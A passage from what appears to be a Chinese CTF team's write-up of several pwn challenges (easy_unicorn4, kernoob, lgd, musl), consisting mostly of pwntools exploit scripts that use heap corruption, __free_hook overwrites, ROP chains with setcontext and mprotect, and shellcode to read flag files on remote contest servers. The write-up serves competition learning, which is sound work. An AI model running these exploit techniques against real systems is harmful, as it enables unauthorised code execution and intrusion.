class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x6020d8</span>)+p64(<span class="number">0x1000</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x602080</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x602088</span>)+p64(<span class="number">0x1000</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x100</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x6020b0</span>)+p64(<span class="number">0x1000</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>))</span><br><span class="line">m = p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">"\x00"</span> </span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">"\x00"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"\x00"</span>*<span class="number">0x18</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x3c36e0</span></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(libc_addr + a.symbols[<span class="string">"__free_hook"</span>])+p64(<span class="number">0x1000</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(libc_addr+a.symbols[<span class="string">"system"</span>]))</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="easy_unicorn4">easy_unicorn4</span></h2><p>首先用下面的代码把dump里面的elf提取出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="string">"""</span></span><br><span class="line"><span class="string">| .gcc_except_table            |            401e64  |               f5c  |         24 |</span></span><br><span class="line"><span class="string">| debug001                     |      7ffff783b000  |               f88  |       4000 |</span></span><br><span class="line"><span class="string">| .data                        |            603090  |              4fb8  |         10 |</span></span><br><span class="line"><span class="string">| libc_2.23.so                 |      7ffff7475000  |              5008  |     1c0000 |</span></span><br><span class="line"><span class="string">| .fini                        |            4015a4  |            1c5008  |          9 |</span></span><br><span class="line"><span class="string">| .plt                         |            4009f0  |            1c5111  |        100 |</span></span><br><span class="line"><span class="string">| .jcr                         |            602e00  |            1c5211  |          8 |</span></span><br><span class="line"><span class="string">| ld_2.23.so1                  |      7ffff7ffc000  |            1c5219  |       1000 |</span></span><br><span class="line"><span class="string">| ld_2.23.so2                  |      7ffff7ffd000  |            1c6219  |       1000 |</span></span><br><span class="line"><span class="string">| LOAD                         |            400000  |            1c7239  |        9c8 |</span></span><br><span class="line"><span class="string">| .init                        |            4009c8  |            1c7c01  |         1a |</span></span><br><span class="line"><span class="string">| [stack]                      |      7ffffffde000  |            1c7c1b  |      21000 |</span></span><br><span class="line"><span class="string">| libstdc__.so.6.0.21          |      7ffff7a55000  |            1e8c2b  |     172000 |</span></span><br><span class="line"><span class="string">| LOAD2                        |            400af8  |            35ac3b  |          8 |</span></span><br><span class="line"><span class="string">| .fini_array                  |            602df8  |            35ac43  |          8 |</span></span><br><span class="line"><span class="string">| .prgend                      |            6031d8  |            35ac4b  |          1 |</span></span><br><span class="line"><span class="string">| libstdc__.so.6.0.212         |      7ffff7dc7000  |            35ac4c  |       a000 |</span></span><br><span class="line"><span class="string">| libstdc__.so.6.0.213         |      7ffff7dd1000  |            364c4c  |       2000 |</span></span><br><span class="line"><span class="string">| .plt.got                     |            400af0  |            366c4c  |          8 |</span></span><br><span class="line"><span class="string">| libstdc__.so.6.0.211         |      7ffff7bc7000  |            366c54  |       d000 |</span></span><br><span class="line"><span class="string">| ld_2.23.so                   |      7ffff7dd7000  |            373c54  |      26000 |</span></span><br><span class="line"><span class="string">| libgcc_s.so.1                |      7ffff783f000  |            399c54  |      16000 |</span></span><br><span class="line"><span class="string">| libgcc_s.so.11               |      7ffff7a54000  |            3afc54  |       1000 |</span></span><br><span class="line"><span class="string">| libm_2.23.so1                |      7ffff7274000  |            3b0c54  |       2000 |</span></span><br><span class="line"><span class="string">| libm_2.23.so3                |      7ffff7474000  |            3b2c54  |       1000 |</span></span><br><span class="line"><span class="string">| libm_2.23.so2                |      7ffff7473000  |            3b3c54  |       1000 |</span></span><br><span class="line"><span class="string">| debug004                     |      7ffff7ffe000  |            3b4c5c  |       1000 |</span></span><br><span class="line"><span class="string">| xctf_pwn                     |            401e88  |            3b5c74  |        178 |</span></span><br><span class="line"><span class="string">| LOAD1                        |            4009e2  |            3b5dec  |          e |</span></span><br><span class="line"><span class="string">| LOAD3                        |            4015a2  |            3b5dfa  |          2 |</span></span><br><span class="line"><span class="string">| LOAD5                        |            4019a7  |            3b5e04  |          1 |</span></span><br><span class="line"><span class="string">| LOAD4                        |            4015ad  |            3b5e05  |          3 |</span></span><br><span class="line"><span class="string">| LOAD7                        |            602e08  |            3b5e08  |        1f0 |</span></span><br><span class="line"><span class="string">| LOAD6                        |            401a84  |            3b5ff8  |          4 |</span></span><br><span class="line"><span class="string">| [vdso]                       |      7ffff7ffa000  |            3b5ffc  |       2000 |</span></span><br><span class="line"><span class="string">| .text                        |            400b00  |            3b7ffc  |        aa2 |</span></span><br><span class="line"><span class="string">| libc_2.23.so3                |      7ffff7839000  |            3b8b5e  |       2000 |</span></span><br><span class="line"><span class="string">| libc_2.23.so2                |      7ffff7835000  |            3bab5e  |       4000 |</span></span><br><span class="line"><span class="string">| libc_2.23.so1                |      7ffff7635000  |            3beb5e  |       9000 |</span></span><br><span class="line"><span class="string">| .rodata                      |            4015b0  |            3c7b5e  |        3f7 |</span></span><br><span class="line"><span class="string">| .got                         |            602ff8  |            3c7f55  |          8 |</span></span><br><span class="line"><span class="string">| .got.plt                     |            603000  |            3c7f5d  |         90 |</span></span><br><span class="line"><span class="string">| .eh_frame_hdr                |            4019a8  |            3c7fed  |         dc |</span></span><br><span class="line"><span class="string">| .bss                         |            6030a0  |            3c80c9  |        138 |</span></span><br><span class="line"><span class="string">| extern                       |            6031e0  |            3c8201  |         98 |</span></span><br><span class="line"><span class="string">| libm_2.23.so                 |      7ffff716c000  |            3c8299  |     108000 |</span></span><br><span class="line"><span class="string">| [vsyscall]                   |  ffffffffff600000  |            4d0299  |       1000 |</span></span><br><span class="line"><span class="string">| [heap]                       |            604000  |            4d1299  |      32000 |</span></span><br><span class="line"><span class="string">| .init_array                  |            602df0  |            503299  |          8 |</span></span><br><span class="line"><span class="string">| .eh_frame                    |            401a88  |            5032a1  |        3dc |</span></span><br><span class="line"><span class="string">| debug003                     |      7ffff7fe7000  |            50367d  |       6000 |</span></span><br><span class="line"><span class="string">| xctf_pwn3                    |            603278  |            50967d  |        d88 |</span></span><br><span class="line"><span class="string">| xctf_pwn1                    |            602000  |            50a405  |        df0 |</span></span><br><span class="line"><span class="string">| xctf_pwn2                    |            6031d9  |            50b1f5  |          7 |</span></span><br><span class="line"><span class="string">| debug002                     |      7ffff7dd3000  |            50b1fc  |       4000 |</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">data = data.split(<span class="string">'\n'</span>)[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">segs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    t = i.split(<span class="string">'|'</span>)[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">    t = [i.strip() <span class="keyword">for</span> i <span class="keyword">in</span> t]</span><br><span class="line">    t = [int(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> t[<span class="number">1</span>:]] + t[:<span class="number">1</span>]</span><br><span class="line">    segs.append(t)</span><br><span class="line"></span><br><span class="line">segs.sort()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> segs:</span><br><span class="line">    print(hex(i[<span class="number">0</span>]),i[<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'./recover_pwn'</span>,<span class="string">'wb'</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./xctf_pwn.dump'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> fr:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> segs:</span><br><span class="line">        <span class="keyword">if</span> i[<span class="number">0</span>] &gt;= <span class="number">0x604000</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        print(i[<span class="number">2</span>])</span><br><span class="line">        fr.seek(i[<span class="number">1</span>])</span><br><span class="line">        f.write(fr.read(i[<span class="number">2</span>]))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>下面是exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = ['tmux','-x','sh','-c']</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span> ]</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    <span class="comment">#p=process('./')</span></span><br><span class="line">    <span class="comment">#p=process(['./x86_sandbox','-debug'],env=&#123;'LD_PRELOAD':'./libunicorn.so.1'&#125;)</span></span><br><span class="line">    p=process([<span class="string">'./x86_sandbox'</span>],env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libunicorn.so.1'</span>&#125;)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'121.37.167.199'</span>, <span class="number">9998</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'[ Disable system call safe mode ]'</span>)</span><br><span class="line">ru(<span class="string">'Your machine-code is '</span>)</span><br><span class="line">ru(<span class="string">'\x1B[1;31;5m '</span>)</span><br><span class="line">data = ru(<span class="string">' '</span>).strip()</span><br><span class="line">ru(<span class="string">'&lt;&lt;'</span>)</span><br><span class="line">data = [int(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> data.split(<span class="string">'-'</span>)]</span><br><span class="line">w = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    w += p32(i)</span><br><span class="line">data = w</span><br><span class="line">data = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> data]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">14</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">    data[i] ^= data[i+<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x20</span>):</span><br><span class="line">    se(<span class="string">'\n'</span>)</span><br><span class="line">    ru(<span class="string">'try'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    se(<span class="string">'%02X'</span>%i)</span><br><span class="line"></span><br><span class="line">se(<span class="string">'\n'</span>)</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">shellcode = asm(<span class="string">'mov r10, rsi'</span>)</span><br><span class="line">shellcode += asm(shellcraft.open(<span class="string">'flag.txt'</span>))</span><br><span class="line">shellcode += asm(shellcraft.read(<span class="number">3</span>,<span class="string">'r10'</span>,<span class="number">0x80</span>))</span><br><span class="line">shellcode += asm(shellcraft.write(<span class="number">1</span>,<span class="string">'r10'</span>,<span class="number">0x80</span>))</span><br><span class="line">shellcode += asm(shellcraft.amd64.linux.exit(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'data ptr:'</span>)</span><br><span class="line">ptr = int(ru(<span class="string">'\n'</span>),<span class="number">16</span>)</span><br><span class="line">ru(<span class="string">'data&lt;&lt;'</span>)</span><br><span class="line">sl(shellcode)</span><br><span class="line">ru(<span class="string">'&lt;&lt;'</span>)</span><br><span class="line">sl(str(ptr))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    ru(<span class="string">'&lt;&lt;'</span>)</span><br><span class="line">    sl(str(ptr+<span class="number">0x400</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="kernoob">kernoob</span></h2><p>解题是非预期，解开.cpio包然后搜索flag即可。 <img src="https://i.loli.net/2020/03/10/MkNyzBPhougt3EL.png" alt="kernoob.png"></p><h2><span id="lgd">lgd</span></h2><p>n132: 虽然有很多看不懂的操作但是存在长度判断错误可以造成溢出，setcontext以orw</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(c)</span>:</span></span><br><span class="line">        p.sendlineafter(<span class="string">"&gt;&gt; "</span>,str(c))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">        cmd(<span class="number">1</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"?\n"</span>,str(size))</span><br><span class="line">        p.sendafter(<span class="string">"?\n"</span>,data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">        cmd(<span class="number">2</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"?\n"</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,c)</span>:</span></span><br><span class="line">        cmd(<span class="number">4</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"?\n"</span>,str(idx))</span><br><span class="line">        p.sendafter(<span class="string">"?\n"</span>,c)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">        cmd(<span class="number">3</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"?\n"</span>,str(idx))</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">libc=ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="comment">#p=process('./pwn',env=&#123;"LD_PRELOAD":"./libc.so.6"&#125;)</span></span><br><span class="line">p=remote(<span class="string">"121.36.209.145"</span>,<span class="number">9998</span>)</span><br><span class="line">p.sendafter(<span class="string">"? \n"</span>,<span class="string">"X"</span>*<span class="number">0x90</span>+p64(<span class="number">0x71</span>)+p64(<span class="number">0xbabe132</span>))</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">"B"</span>*<span class="number">0x200</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">"A"</span>*<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">"A"</span>*<span class="number">0x18</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">"A"</span>*<span class="number">0x200</span>)<span class="comment">#3</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">"A"</span>*<span class="number">0x18</span>+p64(<span class="number">0x91</span>))</span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0x21</span>)*<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">"A"</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">base=u64(p.readline()[:<span class="number">-1</span>]+<span class="string">'\0\0'</span>)-(<span class="number">0x7ffff7dd1b78</span><span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">log.warning(hex(base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"AC"</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0x603280</span>))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"A"</span>)</span><br><span class="line">add(<span class="number">0x1</span>,<span class="string">"A"</span>)</span><br><span class="line">add(<span class="number">0x1</span>,<span class="string">"A"</span>)</span><br><span class="line">add(<span class="number">0x1</span>,<span class="string">"A"</span>)</span><br><span class="line">add(<span class="number">0x1</span>,<span class="string">"A"</span>)</span><br><span class="line">add(<span class="number">0x1</span>,<span class="string">"A"</span>)</span><br><span class="line">add(<span class="number">0x1</span>,<span class="string">"A"</span>*<span class="number">0x71</span>+<span class="string">"\x00"</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"A"</span>)</span><br><span class="line"></span><br><span class="line">rdi=<span class="number">0x0000000000021102</span>+base</span><br><span class="line">rsi=<span class="number">0x00000000000202e8</span>+base</span><br><span class="line">rdx=<span class="number">0x0000000000001b92</span>+base</span><br><span class="line">rax=<span class="number">0x0000000000001b92</span>+base</span><br><span class="line">syscall=<span class="number">0x00000000000bc375</span>+base</span><br><span class="line">rbp=<span class="number">0x000000000001f930</span>+base</span><br><span class="line">leave=<span class="number">0x0000000000042351</span>+base</span><br><span class="line">libc.address=base</span><br><span class="line">rop=flat(rax,<span class="number">0</span>,rdi,<span class="number">0</span>,rsi,<span class="number">0x00604000</span><span class="number">-0x800</span>,rdx,<span class="number">0x300</span>,syscall,<span class="number">0x00604000</span><span class="number">-0x800</span>)</span><br><span class="line">edit(<span class="number">11</span>,rop.ljust(<span class="number">0x50</span>,<span class="string">'\0'</span>)+p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">edit(<span class="number">0</span>,p64(libc.sym[<span class="string">'setcontext'</span>]+<span class="number">0x35</span>))</span><br><span class="line">magic=<span class="number">0x603280</span></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x68</span>)+p64(magic&amp;amp;<span class="number">0xffffff000</span>)+p64(<span class="number">0x1000</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x88</span>)+p64(<span class="number">0x7</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xa0</span>,<span class="string">'\x00'</span>)+p64(<span class="number">0x603290</span>)+p64(libc.sym[<span class="string">'mprotect'</span>])</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *&#123;&#125;'.format(hex(0x47b75+base)))</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">sh=<span class="string">"""</span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">mov rsi,0x603280</span></span><br><span class="line"><span class="string">mov rdx,0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov al,1</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rsi,0x603280</span></span><br><span class="line"><span class="string">mov rdx,0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(asm(shellcraft.open(<span class="string">"./flag"</span>))+asm(sh))</span><br><span class="line">p.interactive(<span class="string">'n132&gt;'</span>)</span><br></pre></td></tr></table></figure><h2><span id="musl">musl</span></h2><p>用的是musl-libc,看一下内存发现可以直接泄漏然后有个溢出造成任意写，继而泄漏stack，完成ROP. （remote的偏移需要一点点爆破）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(c)</span>:</span></span><br><span class="line">        p.sendlineafter(<span class="string">"&gt; "</span>,str(c))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,c=<span class="string">"A\n"</span>,flag=<span class="number">0</span>)</span>:</span></span><br><span class="line">        cmd(<span class="number">1</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"&gt;"</span>,str(size))</span><br><span class="line">        <span class="keyword">if</span>(flag):</span><br><span class="line">                p.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"Y"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                p.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"N"</span>)</span><br><span class="line">        <span class="keyword">if</span>(size!=<span class="number">0</span>):</span><br><span class="line">                p.sendafter(<span class="string">"&gt;"</span>,c)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,c)</span>:</span></span><br><span class="line">        cmd(<span class="number">3</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"&gt;"</span>,str(idx))</span><br><span class="line">        p.send(c)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">        cmd(<span class="number">2</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"&gt;"</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">        cmd(<span class="number">4</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">"&gt;"</span>,str(idx))</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment">#libc=ELF('./libc.so.6')</span></span><br><span class="line">flag=<span class="number">0x000000000602038</span></span><br><span class="line">p=remote(<span class="string">"119.3.158.103"</span>,<span class="number">19008</span>)</span><br><span class="line"><span class="comment">#p=process('./ppp',env=&#123;"LD_PRELOAD":"./libc.so"&#125;)</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">"AAA\n"</span>)</span><br><span class="line">add(<span class="number">0x0</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">base=u64(p.read(<span class="number">6</span>)+<span class="string">'\0\0'</span>)-(<span class="number">0x7f1b10207e50</span><span class="number">-0x7f1b0ff75000</span>)<span class="comment">#+0x18</span></span><br><span class="line">log.warning(hex(base))</span><br><span class="line">add(<span class="number">0x80</span>,p64(<span class="number">0xdeadbeef2</span>)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">0x3</span>)</span><br><span class="line">free(<span 